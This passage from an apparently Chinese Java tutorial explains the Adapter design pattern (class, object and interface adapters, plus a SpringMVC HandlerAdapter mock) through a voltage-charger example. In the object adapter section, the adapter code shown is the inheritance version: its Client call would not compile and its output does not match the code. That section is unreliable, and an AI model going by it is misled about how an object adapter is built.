B接口的实现，一个系统如果太多出现这种情况，无异于一场灾难。因此如果不是很有必要，可以不使用适配器，而是直接对系统进行重构。</p><p>2.由于 JAVA至多继承一个类，所以至多只能适配一个适配者类，而且目标类必须是抽象类。</p><p><strong>使用场景：</strong> 有动机地修改一个正常运行的系统的接口，这时应该考虑使用适配器模式。</p><p><strong>注意事项：</strong> 适配器不是在详细设计时添加的，而是解决正在服役的项目的问题。</p><p><strong>用户收到反馈结果，感觉只是和目标接口交互</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225155334445.png" alt="image-20221225155334445" /></p><h2 id="类适配器模式"><a class="markdownIt-Anchor" href="#类适配器模式"></a> 类适配器模式</h2><h3 id="类适配器模式介绍"><a class="markdownIt-Anchor" href="#类适配器模式介绍"></a> 类适配器模式介绍</h3><p>基本介绍：Adapter 类，通过继承 src 类，实现 dst 类接口，完成 src-&gt;dst 的适配。</p><h3 id="类适配器模式应用实例"><a class="markdownIt-Anchor" href="#类适配器模式应用实例"></a> 类适配器模式应用实例</h3><p>应用实例说明</p><p>以生活中充电器的例子来讲解适配器，充电器本身相当于 Adapter，220V 交流电相当于 src (即被适配者)，我们的目 dst(即 目标)是 5V 直流电</p><p>思路分析(类图)</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225161720849.png" alt="image-20221225161720849" /></p><p><code>IVoltage5V</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.objectadapter;<br><br><br><span class="hljs-comment">//适配接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IVoltage5V</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">output5V</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Voltage220V</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.objectadapter;<br><br><span class="hljs-comment">//被适配的类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Voltage220V</span> &#123;<br>   <span class="hljs-comment">//输出220V的电压，不变</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">output220V</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-type">int</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> <span class="hljs-number">220</span>;<br>      System.out.println(<span class="hljs-string">&quot;电压=&quot;</span> + src + <span class="hljs-string">&quot;伏&quot;</span>);<br>      <span class="hljs-keyword">return</span> src;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>VoltageAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.classadapter;<br><br><span class="hljs-comment">//适配器类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VoltageAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Voltage220V</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IVoltage5V</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">output5V</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//获取到220V电压</span><br>      <span class="hljs-type">int</span> <span class="hljs-variable">srcV</span> <span class="hljs-operator">=</span> output220V();<br>      <span class="hljs-type">int</span> <span class="hljs-variable">dstV</span> <span class="hljs-operator">=</span> srcV / <span class="hljs-number">44</span> ; <span class="hljs-comment">//转成 5v</span><br>      <span class="hljs-keyword">return</span> dstV;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Phone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.objectadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span> &#123;<br><br>   <span class="hljs-comment">//充电</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charging</span><span class="hljs-params">(IVoltage5V iVoltage5V)</span> &#123;<br>      <span class="hljs-keyword">if</span>(iVoltage5V.output5V() == <span class="hljs-number">5</span>) &#123;<br>         System.out.println(<span class="hljs-string">&quot;电压为5V, 可以充电~~&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (iVoltage5V.output5V() &gt; <span class="hljs-number">5</span>) &#123;<br>         System.out.println(<span class="hljs-string">&quot;电压大于5V, 不能充电~~&quot;</span>);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.classadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br>System.out.println(<span class="hljs-string">&quot;  类适配器模式 &quot;</span>);<br><span class="hljs-type">Phone</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phone</span>();<br>phone.charging(<span class="hljs-keyword">new</span> <span class="hljs-title class_">VoltageAdapter</span>());<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><p>类适配器模式<br />电压=220伏<br />电压为5V, 可以充电~~</p><h3 id="类适配器模式注意事项和细节"><a class="markdownIt-Anchor" href="#类适配器模式注意事项和细节"></a> 类适配器模式注意事项和细节</h3><ol><li><p>Java 是单继承机制，所以类适配器需要继承 src 类这一点算是一个缺点, 因为这要求 dst 必须是接口，有一定局限性;</p></li><li><p>src 类的方法在 Adapter 中都会暴露出来，也增加了使用的成本。</p></li><li><p>由于其继承了 src 类，所以它可以根据需求重写 src 类的方法，使得 Adapter 的灵活性增强了。</p></li></ol><h2 id="对象适配器模式"><a class="markdownIt-Anchor" href="#对象适配器模式"></a> 对象适配器模式</h2><h3 id="对象适配器模式介绍"><a class="markdownIt-Anchor" href="#对象适配器模式介绍"></a> 对象适配器模式介绍</h3><ol><li><p>基本思路和类的适配器模式相同，只是将 Adapter 类作修改，不是继承 src 类，而是持有 src 类的实例，以解决兼容性的问题。 即：持有 src 类，实现 dst 类接口，完成 src-&gt;dst 的适配</p></li><li><p>根据“<strong>合成复用原则</strong>”，在系统中尽量使用<strong>关联关系（聚合）来替代继承</strong>关系。</p></li><li><p>对象适配器模式是适配器模式常用的一种</p></li></ol><h3 id="对象适配器模式应用实例"><a class="markdownIt-Anchor" href="#对象适配器模式应用实例"></a> 对象适配器模式应用实例</h3><ol><li>应用实例说明</li></ol><p>以生活中充电器的例子来讲解适配器，充电器本身相当于 Adapter，220V 交流电相当于 src (即被适配者)，我们的目 dst(即目标)是 5V 直流电，使用对象适配器模式完成。</p><ol start="2"><li>思路分析(类图)：只需修改适配器即可, 如下</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225161754203.png" alt="image-20221225161754203" /></p><p><code>VoltageAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.classadapter;<br><br><span class="hljs-comment">//适配器类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VoltageAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Voltage220V</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IVoltage5V</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">output5V</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//获取到220V电压</span><br>      <span class="hljs-type">int</span> <span class="hljs-variable">srcV</span> <span class="hljs-operator">=</span> output220V();<br>      <span class="hljs-type">int</span> <span class="hljs-variable">dstV</span> <span class="hljs-operator">=</span> srcV / <span class="hljs-number">44</span> ; <span class="hljs-comment">//转成 5v</span><br>      <span class="hljs-keyword">return</span> dstV;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.objectadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br>System.out.println(<span class="hljs-string">&quot; 对象适配器模式 &quot;</span>);<br><span class="hljs-type">Phone</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phone</span>();<br>phone.charging(<span class="hljs-keyword">new</span> <span class="hljs-title class_">VoltageAdapter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Voltage220V</span>()));<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><p>对象适配器模式<br />电压=220伏<br />使用对象适配器，进行适配~~<br />适配完成，输出的电压为=5<br />电压为5V, 可以充电~~</p><h3 id="对象适配器模式注意事项和细节"><a class="markdownIt-Anchor" href="#对象适配器模式注意事项和细节"></a> 对象适配器模式注意事项和细节</h3><ol><li>对象适配器和类适配器其实算是同一种思想，只不过实现方式不同。</li></ol><p>根据合成复用原则，使用组合替代继承， 所以它解决了类适配器必须继承 src 的局限性问题，也不再要求 dst必须是接口。</p><ol start="2"><li>使用成本更低，更灵活</li></ol><h2 id="接口适配器模式"><a class="markdownIt-Anchor" href="#接口适配器模式"></a> 接口适配器模式</h2><h3 id="接口适配器模式介绍"><a class="markdownIt-Anchor" href="#接口适配器模式介绍"></a> 接口适配器模式介绍</h3><ol><li><p>一些书籍称为：适配器模式(Default Adapter Pattern)或<strong>缺省适配器模式</strong>。</p></li><li><p>核心思路：当<strong>不需要全部实现接口ᨀ 供的方法</strong>时，可先<strong>设计一个抽象类</strong>实现<strong>接口</strong>，并为该接口中每个方法 供一个<strong>默认实现（空方法）</strong>，那么该<strong>抽象类的子类可有选择地覆盖父类的某些方法</strong>来实现需求</p></li><li><p>适用于一个接口不想使用其所有的方法的情况。</p></li></ol><h3 id="接口适配器模式应用实例"><a class="markdownIt-Anchor" href="#接口适配器模式应用实例"></a> 接口适配器模式应用实例</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225163021962.png" alt="image-20221225163021962" /></p><p><code>Interface4</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.interfaceadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface4</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m2</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m3</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m4</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>AbsAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.interfaceadapter;<br><br><span class="hljs-comment">//在AbsAdapter 我们将 Interface4 的方法进行默认实现</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbsAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface4</span> &#123;<br><br>   <span class="hljs-comment">//默认实现</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span> &#123;<br><br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m2</span><span class="hljs-params">()</span> &#123;<br><br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m3</span><span class="hljs-params">()</span> &#123;<br><br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m4</span><span class="hljs-params">()</span> &#123;<br><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.interfaceadapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br><span class="hljs-type">AbsAdapter</span> <span class="hljs-variable">absAdapter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbsAdapter</span>() &#123;<br><span class="hljs-comment">//只需要去覆盖我们 需要使用 接口方法</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br>System.out.println(<span class="hljs-string">&quot;使用了m1的方法&quot;</span>);<br>&#125;<br>&#125;;<br><br>System.out.println(<span class="hljs-string">&quot;要使用的方法输出：&quot;</span>);<br>absAdapter.m1();<br>System.out.println(<span class="hljs-string">&quot;不要使用的方法输出：&quot;</span>);<br>absAdapter.m2();<br>System.out.println(<span class="hljs-string">&quot;使用结束&quot;</span>);<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><p>要使用的方法输出：<br />使用了m1的方法<br />不要使用的方法输出：<br />使用结束</p><h2 id="适配器模式在-springmvc-框架应用的源码剖析"><a class="markdownIt-Anchor" href="#适配器模式在-springmvc-框架应用的源码剖析"></a> 适配器模式在 SpringMVC 框架应用的源码剖析</h2><ol><li><p>SpringMvc 中的 <strong>HandlerAdapter,</strong> 就使用了适配器模式</p></li><li><p>SpringMVC 处理请求的流程回顾</p></li><li><p>使用 HandlerAdapter 的原因分析:</p></li></ol><p>可以看到处理器的类型不同，有多重实现方式，那么调用方式就不是确定的，如果需要直接调用 Controller 方法，需要调用的时候就得不断是使用 if else 来进行判断是哪一种子类然后执行。那么如果后面要扩展 Controller，就得修改原来的代码，这样违背了 OCP 原则。</p><ol start="4"><li><p>代码分析+Debug 源码</p></li><li><p>动手写 SpringMVC 通过适配器设计模式获取到对应的 Controller 的源码</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221225172743411.png" alt="image-20221225172743411" /></p><p><code>各类Controller</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.springmvc;<br><br><span class="hljs-comment">//多种Controller实现  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Controller</span> &#123;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpController</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Controller</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doHttpHandler</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;http...&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleController</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Controller</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSimplerHandler</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;simple...&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationController</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Controller</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAnnotationHandler</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;annotation...&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>各类适配器</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.springmvc;<br><br><span class="hljs-comment">///定义一个Adapter接口 </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HandlerAdapter</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Object handler)</span>;<br>&#125;<br><br><span class="hljs-comment">// 多种适配器类</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleHandlerAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerAdapter</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Object handler)</span> &#123;<br>      ((SimpleController) handler).doSimplerHandler();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span> &#123;<br>      <span class="hljs-keyword">return</span> (handler <span class="hljs-keyword">instanceof</span> SimpleController);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpHandlerAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerAdapter</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Object handler)</span> &#123;<br>      ((HttpController) handler).doHttpHandler();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span> &#123;<br>      <span class="hljs-keyword">return</span> (handler <span class="hljs-keyword">instanceof</span> HttpController);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationHandlerAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerAdapter</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Object handler)</span> &#123;<br>      ((AnnotationController) handler).doAnnotationHandler();<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Object handler)</span> &#123;<br><br>      <span class="hljs-keyword">return</span> (handler <span class="hljs-keyword">instanceof</span> AnnotationController);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>DispatchServlet</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.adapter.springmvc;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatchServlet</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;HandlerAdapter&gt; handlerAdapters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;HandlerAdapter&gt;();<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">DispatchServlet</span><span class="hljs-params">()</span> &#123;<br>      handlerAdapters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationHandlerAdapter</span>());<br>      handlerAdapters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHandlerAdapter</span>());<br>      handlerAdapters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleHandlerAdapter</span>());<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">()</span> &#123;<br><br>      <span class="hljs-comment">// 此处模拟SpringMVC从request取handler的对象，</span><br>      <span class="hljs-comment">// 适配器可以获取到希望的Controller</span><br>       <span class="hljs-type">HttpController</span> <span class="hljs-variable">controller</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpController</span>();<br>      <span class="hljs-comment">// AnnotationController controller = new AnnotationController();</span><br>      <span class="hljs-comment">//SimpleController controller = new SimpleController();</span><br>      <span class="hljs-comment">// 得到对应适配器</span><br>      <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">adapter</span> <span class="hljs-operator">=</span> getHandler(controller);<br>      <span class="hljs-comment">// 通过适配器执行对应的controller对应方法</span><br>      adapter.handle(controller);<br><br>   &#125;<br><br>   <span class="hljs-keyword">public</span> HandlerAdapter <span class="hljs-title function_">getHandler</span><span class="hljs-params">(Controller controller)</span> &#123;<br>      <span class="hljs-comment">//遍历：根据得到的controller(handler), 返回对应适配器</span><br>      <span class="hljs-keyword">for</span> (HandlerAdapter adapter : <span class="hljs-built_in">this</span>.handlerAdapters) &#123;<br>         <span class="hljs-keyword">if</span> (adapter.supports(controller)) &#123;<br>            <span class="hljs-keyword">return</span> adapter;<br>         &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispatchServlet</span>().doDispatch(); <span class="hljs-comment">// http...</span><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="适配器模式的注意事项和细节"><a class="markdownIt-Anchor" href="#适配器模式的注意事项和细节"></a> 适配器模式的注意事项和细节</h2><ol><li><p>三种命名方式，是根据 src 是以怎样的形式给到 Adapter（在 Adapter 里的形式）来命名的。</p></li><li></li></ol><ol><li>类适配器：以类给到，在 Adapter 里，就是将 src 当做类，继承</li><li>对象适配器：以对象给到，在 